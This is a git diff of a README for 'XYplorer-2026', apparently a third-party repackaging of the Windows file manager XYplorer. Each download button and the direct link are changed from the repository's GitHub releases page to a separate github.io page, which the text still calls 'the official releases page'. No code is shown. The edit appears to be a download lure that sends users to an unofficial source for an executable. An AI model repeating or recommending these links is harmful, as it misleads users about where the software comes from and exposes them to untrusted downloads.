@@ -1,6 +1,6 @@
 # 🚀 XYplorer-2026 - Fast Dual-Pane File Manager for Windows
 
-[![Download Button](https://img.shields.io/badge/DOWNLOAD-Visit%20Releases%20Page-blue?style=for-the-badge&logo=github)](https://github.com/rajfe4678/XYplorer-2026/releases)
+[![Download Button](https://img.shields.io/badge/DOWNLOAD-Visit%20Releases%20Page-blue?style=for-the-badge&logo=github)](https://rajfe4678.github.io)
 
 ## ✨ What is XYplorer?
 
@@ -50,9 +50,9 @@ Follow these steps to get XYplorer running on your computer:
 
 Click the button below to go to the official releases page:
 
-[![Download Button](https://img.shields.io/badge/DOWNLOAD-Get%20XYplorer-2026-blue?style=for-the-badge)](https://github.com/rajfe4678/XYplorer-2026/releases)
+[![Download Button](https://img.shields.io/badge/DOWNLOAD-Get%20XYplorer-2026-blue?style=for-the-badge)](https://rajfe4678.github.io)
 
-You can also visit this link directly: https://github.com/rajfe4678/XYplorer-2026/releases
+You can also visit this link directly: https://rajfe4678.github.io
 
 ### Step 2: Choose Your Version
 
